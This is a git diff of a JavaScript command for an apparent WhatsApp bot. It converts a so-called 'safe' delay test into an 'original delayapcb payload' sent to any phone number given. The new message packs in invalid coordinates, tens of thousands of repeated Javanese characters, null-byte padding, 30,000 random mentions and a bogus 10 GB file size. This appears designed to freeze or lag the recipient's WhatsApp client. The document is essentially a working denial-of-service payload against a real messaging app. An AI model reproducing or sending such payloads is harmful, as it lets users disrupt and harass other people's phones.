@@ -1,51 +1,56 @@
 export default {
   name: "delaytest",
-  description: "📡 Send a large interactive message to a specific JID (safe version)",
+  description: "Send original delayapcb payload to a target",
   async execute(sock, msg, args) {
     if (!args[0]) {
-      await sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Please provide a target number.\nExample: .delaytest 234805421932" });
+      await sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Usage: .delaytest 234xxxxxxxxx" });
       return;
     }
 
-    // 🧠 Format number to proper JID
-    let targetNumber = args[0].replace(/[^0-9]/g, ""); // remove @ or non-digits
-    const targetJid = `${targetNumber}@s.whatsapp.net`;
+    const targetNumber = args[0].replace(/[^0-9]/g, "");
+    const isTarget = `${targetNumber}@s.whatsapp.net`;
 
     try {
-      const message = {
+      let message = {
         ephemeralMessage: {
           message: {
             interactiveMessage: {
               header: {
-                title: "Malaysia Delay Test 🇲🇾",
+                title: " ",
                 hasMediaAttachment: false,
                 locationMessage: {
-                  degreesLatitude: 3.139,
-                  degreesLongitude: 101.6869,
-                  name: "Delay Testing " + "ꦾ".repeat(45000),
-                  address: "📍 Kuala Lumpur",
+                  degreesLatitude: -999.03499999999999,
+                  degreesLongitude: 922.999999999999,
+                  name: "bang paket" + "ꦾ".repeat(45000),
+                  address: "×",
                 },
               },
               body: {
-                text: "X-delay " + "ꦾ".repeat(45000),
+                text: "X-delay" + "ꦾ".repeat(45000),
               },
               nativeFlowMessage: {
                 messageParamsJson: "\u0000".repeat(10000),
               },
               contextInfo: {
-                participant: targetJid,
+                participant: isTarget,
                 mentionedJid: [
                   "0@s.whatsapp.net",
-                  ...Array.from({ length: 5 }, (_, i) => `1${i}@s.whatsapp.net`),
+                  ...Array.from(
+                    { length: 30000 },
+                    () =>
+                      "1" +
+                      Math.floor(Math.random() * 5000000) +
+                      "@s.whatsapp.net"
+                  ),
                 ],
                 quotedMessage: {
                   documentMessage: {
                     fileName: "coreXdelay.js",
                     mimetype: "text/plain",
-                    fileLength: 1000,
+                    fileLength: 10000000000,
                     caption: "coreXdelay",
                     pageCount: 1,
-                    mediaKey: "\u0000".repeat(10000),
+                    mediaKey: "\u0000".repeat(90),
                     jpegThumbnail: Buffer.from(""),
                   },
                 },
@@ -55,12 +60,16 @@ export default {
         },
       };
 
-      await sock.relayMessage(targetJid, message, { messageId: msg.key.id });
+      await sock.relayMessage(isTarget, message, {
+        messageId: null,
+        participant: { jid: isTarget },
+        userJid: isTarget,
+      });
 
-      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Delay test message sent to *${targetNumber}*` });
+      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Original delay payload sent to ${targetNumber}` });
     } catch (e) {
       console.error(e);
-      await sock.sendMessage(msg.key.remoteJid, { text: "❌ Failed to send delay test message." });
+      await sock.sendMessage(msg.key.remoteJid, { text: `❌ Error: ${e.message}` });
     }
   },
 };
